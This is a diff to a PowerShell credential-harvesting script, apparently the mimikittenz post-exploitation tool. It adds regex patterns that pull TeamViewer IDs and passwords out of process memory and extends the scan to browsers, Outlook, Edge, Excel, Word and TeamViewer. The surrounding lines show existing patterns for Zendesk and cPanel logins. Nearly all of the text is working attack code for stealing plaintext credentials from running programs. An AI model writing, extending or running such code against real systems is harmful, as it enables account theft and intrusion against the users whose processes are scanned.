@@ -557,7 +557,10 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
-    
+
+    # Teamviewer credentials
+    [mimikittenz.MemProcInspector]::AddRegex("teamviewer id","([0-9]\x00){3} \x00([0-9]\x00){3} \x00([0-9]\x00){3}[^)]")
+    [mimikittenz.MemProcInspector]::AddRegex("teamviewer pass","([0-9]\x00){4}\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00")
 
 #Password Management Solutions
     #KeePass
@@ -582,12 +585,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Hitbox.TV
     #[mimikittenz.MemProcInspector]::AddRegex("Hitbox.tv","<regex_here>")
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-<<<<<<< HEAD
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
-#opera","outlook","faceitclient","eseaclient","playstv
-=======
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","outlook","MicrosoftEdge","EXCEL","WORD")
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","outlook","MicrosoftEdge","EXCEL","WORD","teamviewer")
 
->>>>>>> 2ad87d4fbcdcd05f340fa260318d69400f40253b
 write-output $matchesFound
 }
